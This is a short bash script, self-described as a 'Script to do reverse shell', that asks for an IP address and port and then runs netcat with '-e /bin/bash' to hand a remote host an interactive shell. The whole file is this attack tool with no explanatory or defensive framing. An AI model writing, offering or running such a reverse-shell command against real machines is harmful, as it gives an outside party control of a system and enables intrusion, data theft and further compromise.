#/bin/bash

echo -e "Script to do reverse shell"
echo -e "Enter with IP"
read ip
echo -e "Enter with Port"
read port

nc -vn $ip $port -e /bin/bash